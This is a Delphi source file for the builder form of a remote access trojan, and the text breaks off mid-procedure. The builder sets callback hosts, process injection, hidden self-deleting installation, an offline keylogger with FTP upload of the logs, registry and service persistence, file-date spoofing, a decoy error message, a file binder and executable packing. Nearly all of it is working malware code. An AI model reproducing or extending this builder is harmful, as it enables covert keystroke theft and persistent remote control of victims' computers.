unit UnitBuilder;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ExtCtrls, Buttons, StdCtrls, Spin, Menus, ImgList, uftp,
  UnitStringEncryption, UnitConstants, UnitIconChanger, UnitFunctions, IniFiles,
  UnitFilesManager, ShellAPI, UnitMain;

type
  TFormBuilder = class(TForm)
    dlgOpen1: TOpenDialog;
    dlgSave1: TSaveDialog;
    il1: TImageList;
    pm1: TPopupMenu;
    N1: TMenuItem;
    E1: TMenuItem;
    D1: TMenuItem;
    N2: TMenuItem;
    Q1: TMenuItem;
    pm2: TPopupMenu;
    E2: TMenuItem;
    R1: TMenuItem;
    pnl1: TPanel;
    lbl25: TLabel;
    pnl2: TPanel;
    tv1: TTreeView;
    lv1: TListView;
    pnlNetwork: TPanel;
    lbl7: TLabel;
    lbl8: TLabel;
    lbl9: TLabel;
    lbl10: TLabel;
    lv2: TListView;
    edtHost: TEdit;
    btn1: TButton;
    pnlFinalization: TPanel;
    mmo1: TMemo;
    pnlInstallation: TPanel;
    chkInstall: TCheckBox;
    grpInstallation: TGroupBox;
    lbl3: TLabel;
    lbl4: TLabel;
    lbl5: TLabel;
    edtDestination: TEdit;
    edtFolder: TEdit;
    edtFilename: TEdit;
    chkMelt: TCheckBox;
    chkHide: TCheckBox;
    chkKeylogger: TCheckBox;
    chkReboot: TCheckBox;
    chkPersistence: TCheckBox;
    pnlMain: TPanel;
    grp3: TGroupBox;
    lbl1: TLabel;
    lbl2: TLabel;
    edtId: TEdit;
    edtPassword: TEdit;
    chk1: TCheckBox;
    grp5: TGroupBox;
    lbl11: TLabel;
    lbl12: TLabel;
    edtMutex: TEdit;
    edtProcessname: TEdit;
    btn2: TButton;
    pnlMessage: TPanel;
    img5: TImage;
    img6: TImage;
    img8: TImage;
    img7: TImage;
    btn3: TSpeedButton;
    chkFakemsg: TCheckBox;
    rgIcon: TRadioGroup;
    edtTitle: TEdit;
    redtBody: TRichEdit;
    btn4: TButton;
    rgButton: TRadioGroup;
    pnlMore: TPanel;
    grp4: TGroupBox;
    lbl24: TLabel;
    img1: TImage;
    edtIconPath: TEdit;
    rgCompression: TRadioGroup;
    chkCompress: TCheckBox;
    pnlStartup: TPanel;
    chkRegStartup: TCheckBox;
    grpRegStartup: TGroupBox;
    lbl6: TLabel;
    chkHKCU: TCheckBox;
    chkHKLM: TCheckBox;
    chkPolicies: TCheckBox;
    edtKeyname: TEdit;
    btn5: TButton;
    chkDate: TCheckBox;
    chk12: TCheckBox;
    cbbDestination: TComboBoxEx;
    sePort: TSpinEdit;
    seDelay: TSpinEdit;
    cbbInjection: TComboBoxEx;
    pnlKeylogger: TPanel;
    chkFtplogs: TCheckBox;
    grpFtplogs: TGroupBox;
    lbl13: TLabel;
    edtFtphost: TEdit;
    lbl14: TLabel;
    edtFtpUser: TEdit;
    lbl15: TLabel;
    edtFtpPass: TEdit;
    lbl16: TLabel;
    edtFtpDir: TEdit;
    lbl17: TLabel;
    seFtpPort: TSpinEdit;
    chk2: TCheckBox;
    btn6: TButton;
    chkServStartup: TCheckBox;
    grpServStartup: TGroupBox;
    lbl18: TLabel;
    lbl20: TLabel;
    edtName: TEdit;
    edtDescription: TEdit;
    lbl19: TLabel;
    se1: TSpinEdit;
    lbl21: TLabel;
    pnlBinder: TPanel;
    lvBinder: TListView;
    pm3: TPopupMenu;
    A2: TMenuItem;
    MenuItem1: TMenuItem;
    pnl3: TPanel;
    cbbBinder: TComboBoxEx;
    chkBinder: TCheckBox;
    lbl22: TLabel;
    edtBinder: TEdit;
    procedure lv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure lv1DblClick(Sender: TObject);
    procedure tv1Change(Sender: TObject; Node: TTreeNode);
    procedure N1Click(Sender: TObject);
    procedure E1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure Q1Click(Sender: TObject);
    procedure E2Click(Sender: TObject);
    procedure lv2ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R1Click(Sender: TObject);
    procedure cbbInjectionChange(Sender: TObject);
    procedure chk1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure cbbDestinationChange(Sender: TObject);
    procedure chkRegStartupClick(Sender: TObject);
    procedure chkServStartupClick(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure chkFakemsgClick(Sender: TObject);
    procedure chkInstallClick(Sender: TObject);
    procedure chkFtplogsClick(Sender: TObject);
    procedure chk2Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure lbl24Click(Sender: TObject);
    procedure chkCompressClick(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure A2Click(Sender: TObject);
    procedure MenuItem1Click(Sender: TObject);
    procedure lvBinderSelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure chkBinderClick(Sender: TObject);
    procedure cbbBinderChange(Sender: TObject);
  private
    { Private declarations }
    EnableCloseButtton: Boolean;
    MPRESS, UPX: string;
    ClientFile, IconPath: string;
    ProfileConfig, ProfileName: string;
    HostList: string;
    function GrabHostList: string;
    procedure SetHostList(HostList: string);
    procedure ShowConfiguration;
    procedure ListProfiles;
    procedure SaveProfile;
    function WriteSettings: Boolean;
  public
    { Public declarations }
  end;

var
  FormBuilder: TFormBuilder;

implementation

{$R *.dfm}
        
type
  PClientConfiguration = ^TClientConfiguration;
  TClientConfiguration = record
    Hosts: array [0..4] of string;
    Ports: array [0..4] of Word;
    FTPOptions, MessageParams: array[0..3] of string;
    StartupOptions: Integer;
    Delay, FTPPort, FTPDelay: Word;
    ClientId, StartupKey, Password, User_Id, ServiceDesc, MutexName,
    ServiceName, Foldername, FileName, Destination, InjectInto: string;
    FakeMessage, Install, Keylogger, Melt, Startup, Hide,
    WaitReboot, ChangeDate, HKCUStartup, HKLMStartup,
    PoliciesStartup, Persistence, FTPLogs, Binded: Boolean;
  end;

  TFileOptions = class
    Drop, Execute: Boolean;
    Path: Integer;
  end;

var
  ClientConfiguration: TClientConfiguration;

procedure TFormBuilder.lv1ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv1.Selected) then
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False;
    pm1.Items[0].Enabled := True;
  end
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;
end;
    
procedure TFormBuilder.lv2ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv2.Selected) then
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False
  else for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
end;

procedure TFormBuilder.lv1DblClick(Sender: TObject);
begin
  E1.Click;
end;

procedure TFormBuilder.tv1Change(Sender: TObject; Node: TTreeNode);
begin
  if tv1.Items.Item[0].Selected then
  begin
    pnlMain.BringToFront;
    btn5.Visible := False;
  end
  else

  if tv1.Items.Item[1].Selected then
  begin
    pnlNetwork.BringToFront;
    btn5.Visible := False;
  end
  else

  if tv1.Items.Item[2].Selected then
  begin
    pnlInstallation.BringToFront;
    btn5.Visible := False;
  end
  else

  if tv1.Items.Item[3].Selected then
  begin
    pnlStartup.BringToFront;
    btn5.Visible := False;
  end
  else

  if tv1.Items.Item[4].Selected then
  begin
    pnlMessage.BringToFront;
    btn5.Visible := False;
  end
  else

  if tv1.Items.Item[5].Selected then
  begin
    if chkKeylogger.Checked = False then Exit;
    pnlKeylogger.BringToFront;
    btn5.Visible := False;
  end
  else

  if tv1.Items.Item[6].Selected then
  begin
    pnlMore.BringToFront;
    btn5.Visible := False;
  end
  else

  if tv1.Items.Item[7].Selected then
  begin
    pnlBinder.BringToFront;
    btn5.Visible := False;
  end
  else

  if tv1.Items.Item[8].Selected then
  begin
    pnlFinalization.BringToFront;
    ShowConfiguration;
    btn5.Visible := True;
  end;
end;

procedure TFormBuilder.N1Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
  IniFile: TIniFile;
  TmpItem: TListItem;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + '\Profiles';
  if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Profile name', TmpStr1) then Exit;

  TmpItem := lv1.Items.Add;
  TmpItem.Caption := TmpStr1;
  TmpItem.ImageIndex := 0;

  TmpStr := TmpStr + '\' + TmpStr1;

  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteString('Main settings', 'Client id', TmpStr1);
  IniFile.WriteString('Main settings', 'Client password', 'Wr #!d3');
  IniFile.WriteInteger('Main settings', 'InjectInto', 3);
  IniFile.WriteString('Main settings', 'InjectInto string', 'notepad.exe');
                                                                        
  IniFile.WriteString('Network', 'Connection host', '127.0.0.1:80|');
  IniFile.WriteInteger('Network', 'Connection delay', 2000);
  
  IniFile.WriteBool('Installation', 'Installation', False);
  IniFile.WriteInteger('Installation', 'Destination', 4);
  IniFile.WriteString('Installation', 'Custom path', '');
  IniFile.WriteString('Installation', 'Client folder', 'Folder');
  IniFile.WriteString('Installation', 'Client filename', 'Filename');
  IniFile.WriteBool('Installation', 'Melt', True);
  IniFile.WriteBool('Installation', 'Hide client', True);
  IniFile.WriteBool('Installation', 'Offline keylogger', True);
  IniFile.WriteBool('Installation', 'Reboot', False);
  IniFile.WriteBool('Installation', 'Persistence', False);  
  IniFile.WriteBool('Installation', 'Change creation date', False);

  IniFile.WriteBool('Registry startup', 'Registry startup', False);
  IniFile.WriteBool('Registry startup', 'HKCU', True);
  IniFile.WriteBool('Registry startup', 'HKLM', True);
  IniFile.WriteBool('Registry startup', 'Policies', False);
  IniFile.WriteString('Registry startup', 'Key name', TmpStr1);

  IniFile.WriteBool('Service startup', 'Service startup', False);
  IniFile.WriteString('Service startup', 'Service name', TmpStr1);
  IniFile.WriteString('Service startup', 'Service description', 'Description of service');

  IniFile.WriteBool('Fake message', 'Fake message', False);
  IniFile.WriteString('Fake message', 'Message title', 'Error');
  IniFile.WriteString('Fake message', 'Message body', 'This application is not a win32 valid application.');
  IniFile.WriteInteger('Fake message', 'Message type', 0);
  IniFile.WriteInteger('Fake message', 'Message buttons', 0);

  IniFile.WriteBool('Send keylogs by ftp', 'Send keylogs by ftp', False);
  IniFile.WriteString('Send keylogs by ftp', 'Ftp host', FtpHost);
  IniFile.WriteString('Send keylogs by ftp', 'Ftp user', FtpUser);
  IniFile.WriteString('Send keylogs by ftp', 'Ftp pass', FtpPass);
  IniFile.WriteString('Send keylogs by ftp', 'Ftp directory', FtpDir);
  IniFile.WriteInteger('Send keylogs by ftp', 'Ftp port', FtpPort);
  IniFile.WriteInteger('Send keylogs by ftp', 'Send keylogs every', 15);

  IniFile.WriteBool('More options', 'Compression', True);
  IniFile.WriteInteger('More options', 'Compression type', 0);

  IniFile.WriteBool('Profile', 'Autosave', True);
  IniFile.Free;
end;

function TFormBuilder.GrabHostList: string;
var
  i: Integer;
begin
  Result := '';
  for i:= 0 to lv2.Items.Count-1 do
  Result := Result + lv2.Items[i].Caption + ':' + lv2.Items[i].SubItems[0] + '|';
end;

procedure TFormBuilder.SetHostList(HostList: string);
var
  TmpItem: TListItem;
begin
  lv2.Clear;
  lv2.Items.BeginUpdate;

  while HostList <> '' do
  begin
    TmpItem := lv2.Items.Add;
    TmpItem.Caption := Copy(HostList, 1, Pos(':', HostList) - 1);
    Delete(HostList, 1, Pos(':', HostList));
    TmpItem.SubItems.Add(Copy(HostList, 1, Pos('|', HostList) - 1));
    Delete(HostList, 1, Pos('|', HostList));
  end;

  lv2.Items.EndUpdate;
end;

procedure TFormBuilder.E1Click(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  if not Assigned(lv1.Selected) then Exit;
  ProfileName := lv1.Selected.Caption;
  TmpStr := ExtractFilePath(ParamStr(0)) + '\Profiles\' + ProfileName;
  if not FileExists(TmpStr) then
  begin
    lv1.Selected.Delete;
    MessageBox(Handle, PChar('Profile "' + TmpStr + '" not found.'),
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  IniFile := TIniFile.Create(TmpStr);
  edtId.Text := IniFile.ReadString('Main settings', 'Client id', 'test');
  edtPassword.Text := IniFile.ReadString('Main settings', 'Client password', 'Wr #!d3');
  cbbInjection.ItemIndex := IniFile.ReadInteger('Main settings', 'InjectInto', 3);
  cbbInjectionChange(Sender);
  edtProcessname.Text := IniFile.ReadString('Main settings', 'InjectInto string', 'notepad.exe');

  HostList := IniFile.ReadString('Network', 'Connection host', '127.0.0.1:80|');
  seDelay.Text := IniFile.ReadString('Network', 'Connection delay', '2000');

  chkInstall.Checked := IniFile.ReadBool('Installation', 'Installation', False);
  cbbDestination.ItemIndex := IniFile.ReadInteger('Installation', 'Destination', 4);
  cbbDestinationChange(Sender);
  edtDestination.Text := IniFile.ReadString('Installation', 'Custom path', 'Temp');
  edtFolder.Text := IniFile.ReadString('Installation', 'Client folder', 'Folder');
  edtFilename.Text := IniFile.ReadString('Installation', 'Client filename', 'Filename');
  chkMelt.Checked := IniFile.ReadBool('Installation', 'Melt', True);
  chkHide.Checked := IniFile.ReadBool('Installation', 'Hide client', True);
  chkKeylogger.Checked := IniFile.ReadBool('Installation', 'Offline keylogger', True);
  chkReboot.Checked := IniFile.ReadBool('Installation', 'Reboot', True);
  chkPersistence.Checked := IniFile.ReadBool('Installation', 'Persistence', False);
  chkDate.Checked := IniFile.ReadBool('Installation', 'Change creation date', False);

  chkRegStartup.Checked := IniFile.ReadBool('Registry startup', 'Registry startup', False);
  chkRegStartupClick(Sender);
  chkHKCU.Checked := IniFile.ReadBool('Registry startup', 'HKCU', True);
  chkHKLM.Checked := IniFile.ReadBool('Registry startup', 'HKLM', True);
  chkPolicies.Checked := IniFile.ReadBool('Registry startup', 'Policies', False);
  edtKeyname.Text := IniFile.ReadString('Registry startup', 'Key name', 'test');
          
  chkServStartup.Checked := IniFile.ReadBool('Service startup', 'Service startup', False);
  chkServStartupClick(Sender);
  edtName.Text := IniFile.ReadString('Service startup', 'Service name', 'test');
  edtDescription.Text := IniFile.ReadString('Service startup', 'Service description', 'description of service');

  chkFakemsg.Checked := IniFile.ReadBool('Fake message', 'Fake message', False);
  edtTitle.Text := IniFile.ReadString('Fake message', 'Message title', 'Error');
  redtBody.Text := IniFile.ReadString('Fake message', 'Message body', 'This application is not a win32 valid application.');
  rgIcon.ItemIndex := IniFile.ReadInteger('Fake message', 'Message type', 0);
  rgButton.ItemIndex := IniFile.ReadInteger('Fake message', 'Message buttons', 0);

  chkFtplogs.Checked := IniFile.ReadBool('Send keylogs by ftp', 'Send keylogs by ftp', False);
  edtFtphost.Text := IniFile.ReadString('Send keylogs by ftp', 'Ftp host', FtpHost);
  edtFtpUser.Text := IniFile.ReadString('Send keylogs by ftp', 'Ftp user', FtpUser);
  edtFtpPass.Text := IniFile.ReadString('Send keylogs by ftp', 'Ftp pass', FtpPass);
  edtFtpDir.Text := IniFile.ReadString('Send keylogs by ftp', 'Ftp directory', FtpDir);
  seFtpPort.Value := IniFile.ReadInteger('Send keylogs by ftp', 'Ftp port', FtpPort);
  se1.Value := IniFile.ReadInteger('Send keylogs by ftp', 'Send keylogs every', 15);

  chkCompress.Checked := IniFile.ReadBool('More options', 'Compression', True);
  rgCompression.ItemIndex := IniFile.ReadInteger('More options', 'Compression type', 0);

  chk12.Checked := IniFile.ReadBool('Profile', 'Autosave', True);
  IniFile.Free;

  SetHostList(HostList);

  MessageBox(Handle, 'Profile loaded!.', PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
            MB_OK or MB_ICONINFORMATION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
end;

procedure TFormBuilder.D1Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + '\Profiles\' + lv1.Selected.Caption;
  lv1.Selected.Delete;
  DeleteFile(TmpStr);
  mmo1.Lines.Clear;
end;

procedure TFormBuilder.Q1Click(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  if not Assigned(lv1.Selected) then Exit;
  ProfileName := lv1.Selected.Caption;
  TmpStr := ExtractFilePath(ParamStr(0)) + '\Profiles\' + ProfileName;
  if not FileExists(TmpStr) then
  begin
    lv1.Selected.Delete;
    MessageBox(Handle, PChar('Profile "' + TmpStr + '" not found.'),
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  IniFile := TIniFile.Create(TmpStr);
  edtId.Text := IniFile.ReadString('Main settings', 'Client id', 'test');
  edtPassword.Text := IniFile.ReadString('Main settings', 'Client password', 'Wr #!d3');
  cbbInjection.ItemIndex := IniFile.ReadInteger('Main settings', 'InjectInto', 3);
  cbbInjectionChange(Sender);
  edtProcessname.Text := IniFile.ReadString('Main settings', 'InjectInto string', 'notepad.exe');

  HostList := IniFile.ReadString('Network', 'Connection host', '127.0.0.1:80|');
  seDelay.Text := IniFile.ReadString('Network', 'Connection delay', '2000');

  chkInstall.Checked := IniFile.ReadBool('Installation', 'Installation', False);
  cbbDestination.ItemIndex := IniFile.ReadInteger('Installation', 'Destination', 4);
  cbbDestinationChange(Sender);
  edtDestination.Text := IniFile.ReadString('Installation', 'Custom path', 'Temp');
  edtFolder.Text := IniFile.ReadString('Installation', 'Client folder', 'Folder');
  edtFilename.Text := IniFile.ReadString('Installation', 'Client filename', 'Filename');
  chkMelt.Checked := IniFile.ReadBool('Installation', 'Melt', True);
  chkHide.Checked := IniFile.ReadBool('Installation', 'Hide client', True);
  chkKeylogger.Checked := IniFile.ReadBool('Installation', 'Offline keylogger', True);
  chkReboot.Checked := IniFile.ReadBool('Installation', 'Reboot', True);
  chkPersistence.Checked := IniFile.ReadBool('Installation', 'Persistence', False);
  chkDate.Checked := IniFile.ReadBool('Installation', 'Change creation date', False);

  chkRegStartup.Checked := IniFile.ReadBool('Registry startup', 'Registry startup', False);
  chkRegStartupClick(Sender);
  chkHKCU.Checked := IniFile.ReadBool('Registry startup', 'HKCU', True);
  chkHKLM.Checked := IniFile.ReadBool('Registry startup', 'HKLM', True);
  chkPolicies.Checked := IniFile.ReadBool('Registry startup', 'Policies', False);
  edtKeyname.Text := IniFile.ReadString('Registry startup', 'Key name', 'test');
          
  chkServStartup.Checked := IniFile.ReadBool('Service startup', 'Service startup', False);
  chkServStartupClick(Sender);
  edtName.Text := IniFile.ReadString('Service startup', 'Service name', 'test');
  edtDescription.Text := IniFile.ReadString('Service startup', 'Service description', 'description of service');

  chkFakemsg.Checked := IniFile.ReadBool('Fake message', 'Fake message', False);
  edtTitle.Text := IniFile.ReadString('Fake message', 'Message title', 'Error');
  redtBody.Text := IniFile.ReadString('Fake message', 'Message body', 'This application is not a win32 valid application.');
  rgIcon.ItemIndex := IniFile.ReadInteger('Fake message', 'Message type', 0);
  rgButton.ItemIndex := IniFile.ReadInteger('Fake message', 'Message buttons', 0);

  chkFtplogs.Checked := IniFile.ReadBool('Send keylogs by ftp', 'Send keylogs by ftp', False);
  edtFtphost.Text := IniFile.ReadString('Send keylogs by ftp', 'Ftp host', FtpHost);
  edtFtpUser.Text := IniFile.ReadString('Send keylogs by ftp', 'Ftp user', FtpUser);
  edtFtpPass.Text := IniFile.ReadString('Send keylogs by ftp', 'Ftp pass', FtpPass);
  edtFtpDir.Text := IniFile.ReadString('Send keylogs by ftp', 'Ftp directory', FtpDir);
  seFtpPort.Value := IniFile.ReadInteger('Send keylogs by ftp', 'Ftp port', FtpPort);
  se1.Value := IniFile.ReadInteger('Send keylogs by ftp', 'Send keylogs every', 15);

  chkCompress.Checked := IniFile.ReadBool('More options', 'Compression', True);
  rgCompression.ItemIndex := IniFile.ReadInteger('More options', 'Compression type', 0);

  chk12.Checked := IniFile.ReadBool('Profile', 'Autosave', True);
  IniFile.Free;

  SetHostList(HostList);
  btn2.Click;
  btn5.Click;
end;

procedure TFormBuilder.E2Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Host:port (Eg: 127.0.0.1:80)', TmpStr) then Exit;
  if Pos(':', TmpStr) < 0 then Exit;
  lv2.Selected.Caption := Copy(TmpStr, 1, Pos(':', TmpStr)-1);
  Delete(TmpStr, 1, Pos(':', TmpStr));
  lv2.Selected.SubItems[0] := TmpStr;
end;

procedure TFormBuilder.R1Click(Sender: TObject);
begin
  lv2.Selected.Delete;
end;
   
procedure TFormBuilder.chk1Click(Sender: TObject);
begin
   if chk1.Checked then edtPassword.PasswordChar := #0 else
    edtPassword.PasswordChar := '*';
end;

procedure TFormBuilder.cbbInjectionChange(Sender: TObject);
var
  i: Integer;
begin
  if cbbInjection.ItemIndex = 2 then
  begin
    edtProcessname.Text := 'notepad.exe';
    edtProcessname.Visible := True;
  end
  else
  begin
    i := cbbInjection.ItemIndex;
    edtProcessname.Text := cbbInjection.Items.Strings[i];
    edtProcessname.Visible := False;
  end;
end;
                   
function RandomMutex: string;
const
  TmpStr = '0123456789ABCDEFGHJKLMNPQRSTUVWXYZ';
var
  i: Integer;
  TmpStr1: string;
begin
  TmpStr1 := '';
  Randomize;
  for i := 0 to 10 do TmpStr1 := TmpStr1 + TmpStr[Random(Length(TmpStr)) + 1];
  Result := 'PRMUTEX_' + TmpStr1;
end;

procedure TFormBuilder.btn2Click(Sender: TObject);
begin
  edtMutex.Text := RandomMutex;
end;

procedure TFormBuilder.btn1Click(Sender: TObject);
var
  TmpStr: string;
  TmpItem: TListItem;
begin
  if (edtHost.Text = '') or (sePort.Text = '') then Exit;

  if lv2.Items.Count >= 5 then
  begin
    MessageBox(Handle, 'Maximum hosts allowed is 5.',
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONINFORMATION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  TmpItem := lv2.Items.Add;
  TmpItem.Caption := edtHost.Text;
  TmpItem.SubItems.Add(sePort.Text);
end;
        
procedure TFormBuilder.chkInstallClick(Sender: TObject);
begin
  if chkInstall.Checked then grpInstallation.Visible := True else
    grpInstallation.Visible := False;
end;

procedure TFormBuilder.cbbDestinationChange(Sender: TObject);
var
  i: Integer;
begin
  if cbbDestination.ItemIndex = 6 then
  begin
    edtDestination.Text := '';
    edtDestination.Visible := True;
  end
  else
  begin
    i := cbbDestination.ItemIndex;
    edtDestination.Text := cbbDestination.Items.Strings[i];
    edtDestination.Visible := False;
  end;
end;

procedure TFormBuilder.chkRegStartupClick(Sender: TObject);
begin
  if chkRegStartup.Checked = True then
  begin
    if chkServStartup.Checked then chkServStartup.Checked := False;
    chkServStartupClick(Sender);
    grpRegStartup.Visible := True;
  end
  else grpRegStartup.Visible := False;
end;

procedure TFormBuilder.chkServStartupClick(Sender: TObject);
begin
  if chkServStartup.Checked = True then
  begin
    if chkRegStartup.Checked then chkRegStartup.Checked := False;
    chkRegStartupClick(Sender);
    grpServStartup.Visible := True;
  end
  else grpServStartup.Visible := False;
end;
   
function ShowMsg(Hwnd: HWND; Text: string; Title: string; mType: Integer; bType: Integer): Integer;
begin
  if mType = 0 then mType := MB_ICONERROR else
  if mType = 1 then mType := MB_ICONWARNING else
  if mType = 2 then mType := MB_ICONQUESTION else
  if mType = 3 then mType := MB_ICONINFORMATION else mType := 0;

  case bType of
    0: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OK);
    1: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OKCANCEL);
    2: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNO);
    3: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNOCANCEL);
    4: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_RETRYCANCEL);
    5: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_ABORTRETRYIGNORE);
  end;
end;
    
procedure TFormBuilder.chkFakemsgClick(Sender: TObject);
begin
  if chkFakemsg.Checked then
  begin
    rgIcon.Enabled := True;
    rgButton.Enabled := True;
    edtTitle.Enabled := True;
    redtBody.Enabled := True;
    btn4.Enabled := True;
  end
  else
  begin
    rgIcon.Enabled := False;
    rgButton.Enabled := False;
    edtTitle.Enabled := False;
    redtBody.Enabled := False;
    btn4.Enabled := False;
  end;
end;

procedure TFormBuilder.btn4Click(Sender: TObject);
begin
  if (edtTitle.Text = '') or (redtBody.Text = '') then Exit;
  ShowMsg(Handle, redtBody.Text, edtTitle.Text, rgIcon.ItemIndex, rgButton.ItemIndex);
end;

procedure TFormBuilder.chkFtplogsClick(Sender: TObject);
begin
  if chkFtplogs.Checked then grpFtplogs.Visible := True else
    grpFtplogs.Visible := False;
end;

procedure TFormBuilder.chk2Click(Sender: TObject);
begin
  if chk2.Checked then edtFtpPass.PasswordChar := #0 else edtFtpPass.PasswordChar := '*';
end;

procedure TFormBuilder.btn6Click(Sender: TObject);
var
  FtpAccess: tFtpAccess;
begin
  if (edtFtphost.Text = '') or (edtFtpUser.Text = '') or (edtFtpPass.Text = '') or
    (edtFtpDir.Text = '')
  then
  begin
    MessageBox(Handle, 'One or more entry are empty.',
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := '(*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  FTpAccess := tFtpAccess.create(edtFtphost.Text, edtFtpUser.Text, edtFtpPass.Text, seFtpPort.Value);

  if (not Assigned(FTpAccess)) or (not FTpAccess.connected) then
  begin
    MessageBox(Handle, 'Failed to connect.',
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    FTpAccess.Free;
    Exit;
  end;

  if FTpAccess.SetDir('./' + edtFtpDir.Text) = False then
  begin
    MessageBox(Handle, 'Failed to access directory.',
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    FTpAccess.Free;
    Exit;
  end;

  if FTpAccess.PutFile(dlgOpen1.FileName, ExtractFileName(dlgOpen1.FileName)) = False then
  begin
    MessageBox(Handle, 'Failed to send file.',
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    FTpAccess.Free;
    Exit;
  end;

  MessageBox(Handle, 'File sent successfully!',
             PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
             MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
             
  FTpAccess.Free;
end;

procedure TFormBuilder.lbl24Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'Icon (*.ico) or Executable (*.exe)|*.ico; *.exe';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  if LowerCase(ExtractFileExt(dlgOpen1.FileName)) = '.ico' then
  begin
    img1.Picture.LoadFromFile(dlgOpen1.FileName);
    edtIconPath.Text := dlgOpen1.FileName;
  end
  else

  if LowerCase(ExtractFileExt(dlgOpen1.FileName)) = '.exe' then
  begin
    try
      TmpStr := ExtractFilePath(ParamStr(0)) + 'Icons';
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      TmpStr1 := ExtractFileName(dlgOpen1.FileName);
      TmpStr1 := Copy(TmpStr1, 1, Pos('.', TmpStr1)-1);
      TmpStr1 := TmpStr1 + '.ico';
      TmpStr := TmpStr + '\' + TmpStr1;
      edtIconPath.Text := TmpStr;

      SaveApplicationIconGroup(PChar(TmpStr), PChar(dlgOpen1.FileName));
    except
      MessageBox(Handle, 'Failed to save executable icon.',
                 PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                 MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    end;

    img1.Picture.LoadFromFile(TmpStr);
  end;
end;

procedure TFormBuilder.chkCompressClick(Sender: TObject);
begin
  if chkCompress.Checked then rgCompression.Visible := True else
    rgCompression.Visible := False;
end;
               
procedure TFormBuilder.A2Click(Sender: TObject);
var
  TmpItem: TListItem; 
  FileOptions: TFileOptions;
begin
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := '(*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

